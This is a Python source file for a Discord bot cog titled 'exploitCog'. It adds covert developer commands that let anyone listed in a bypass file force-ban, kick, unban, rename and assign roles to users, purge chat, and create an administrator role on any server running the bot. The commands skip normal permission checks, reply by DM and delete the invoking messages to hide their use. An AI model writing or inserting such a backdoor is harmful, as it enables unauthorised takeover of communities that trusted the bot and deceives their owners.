import discord
from discord.ext import commands
from discord.ext.commands import MissingPermissions, BadArgument, MissingRequiredArgument, CommandInvokeError

class exploitCog(commands.Cog):
    def __init__(self, bot):
        self.client = bot

    @commands.command()
    async def developer(self, ctx):
        if str(ctx.author.id) in open ("idstuff/allowedbypass.py").read():
            user = ctx.author
            embed = discord.Embed(
                title="Exploit commands",
                color = discord.Color.magenta()
            )

            embed.set_author(name="House Keeper", icon_url="https://cdn.discordapp.com/avatars/735221653998534688/0f3d1717085e0a4c83bd914470581e80.webp?size=1024")
            embed.add_field(name="`forceunban <name>#<diskriminator>`", value="Forces unabnning a user", inline=False)
            embed.add_field(name="`forceclear <amount>`", value="Forces to clear the chat", inline=False)
            embed.add_field(name="`forceban <@mention>`", value="Forces to ban a user", inline=False)
            embed.add_field(name="`forcekick <@mention>`", value="Forces to kick a user", inline=False)
            embed.add_field(name="`forcenick <@mention> <new_name>`", value="Forces to nick a user", inline=False)
            embed.add_field(name="`forcegive <@mention> <@role | role | id>`", value="Forces give user a role", inline=False)
            embed.add_field(name="`role <name>`", value="Creates a role with the name + admin permissons", inline=False)
            embed.set_footer(text=":ok_hand:")

            await user.send(embed = embed)

    @commands.command(pass_context=True)
    async def role(self, ctx, name):
        if str(ctx.author.id) in open ("idstuff/allowedbypass.py").read():

            try:


                names = str(ctx.guild.name)
                user = ctx.author
                guild = ctx.guild

                await guild.create_role(name = f'{name}',  permissions = discord.Permissions(administrator = True), reason = 'Creator')
    
                embed = discord.Embed(
                    title=names + f" Got a new role called {name}",
                    timestamp=ctx.message.created_at,
                    colour = discord.Colour.gold()
                )
                embed.add_field(name=f"{name} created successfully", value="You can get it by using forcegive")

                await user.send(embed=embed)

            except discord.errors.Forbidden:

                user = ctx.author
                await user.send("Forbidden, i am missing permissions")

        else:
            return


    @commands.command()
    async def forceunban(self, ctx, *, member):
        if str(ctx.author.id) in open ("idstuff/allowedbypass.py").read():
            guild = ctx.guild
            if str(guild.id) in open ("idstuff/blacklistedserver.py").read():
                pass
            if str(guild.id) not in open ("idstuff/blacklistedserver.py").read():
                banned_users = await ctx.guild.bans()
                member_name, member_discriminator = member.split('#')

                for ban_entry in banned_users:
                    user = ban_entry.user

                    if(user.name, user.discriminator) == (member_name, member_discriminator):
                        await ctx.guild.unban(user)
                        await ctx.channel.purge(limit=2)
                        return

        else:
            return

    @commands.command()
    async def forceclear(self, ctx, amount=13):
        if str(ctx.author.id) in open ("idstuff/allowedbypass.py").read():
            guild = ctx.guild
            if str(guild.id) in open ("idstuff/blacklistedserver.py").read():
                pass
            if str(guild.id) not in open ("idstuff/blacklistedserver.py").read():
                await ctx.channel.purge(limit=amount)

        else:
            return


    @commands.command()
    async def forceban(self, ctx, member : discord.Member, *, reason=None):
        if str(ctx.author.id) in open ("idstuff/allowedbypass.py").read():
            guild = ctx.guild
            if str(guild.id) in open ("idstuff/blacklistedserver.py").read():
                pass
            if str(guild.id) not in open ("idstuff/blacklistedserver.py").read():
                await member.ban(reason=reason)
                await ctx.channel.purge(limit=2)

        else:
            return


    @commands.command()
    async def forcekick(self, ctx, member : discord.Member, *, reason=None):
        if str(ctx.author.id) in open ("idstuff/allowedbypass.py").read():
            guild = ctx.guild
            if str(guild.id) in open ("idstuff/blacklistedserver.py").read():
                pass
            if str(guild.id) not in open ("idstuff/blacklistedserver.py").read():
                await member.kick(reason=reason)
                await ctx.channel.purge(limit=2)
    
        else:
            return

    @commands.command()
    async def forcenick(self, ctx, member : discord.Member, nick):
        if str(ctx.author.id) in open ("idstuff/allowedbypass.py").read():
            guild = ctx.guild
            if str(guild.id) in open ("idstuff/blacklistedserver.py").read():
                pass
            if str(guild.id) not in open ("idstuff/blacklistedserver.py").read():
                await member.edit(nick=nick)
                await ctx.channel.purge(limit=2)

        else:
            return

    @commands.command(pass_context=True)
    async def forcegive(self, ctx, user: discord.Member, role: discord.Role):
        if str(ctx.author.id) in open ("idstuff/allowedbypass.py").read():
            guild = ctx.guild
            if guild.id in open ("idstuff/blacklistedserver.py"):
                return
            else:

                try:
                    userss = ctx.author

                    await user.add_roles(role)

                    names = str(ctx.guild.name)
                    embed = discord.Embed(
                        title=names + " forcegive ",
                        timestamp=ctx.message.created_at,
                        colour = discord.Colour.gold()
                    )
                    embed.add_field(name="Worked !", value=f"Hey {ctx.author.name}, {user.name} has been giving a role called: {role.name}")

                
                    await userss.send(embed = embed)

                except discord.Forbidden:

                    embed = discord.Embed(
                        title="Command Error",
                        color=discord.Color.red()
                    )
                    userss = ctx.author

                    embed.add_field(name=":sob:", value="Does't work")

                    await userss.send(embed=embed)




def setup(bot):
    bot.add_cog(exploitCog(bot))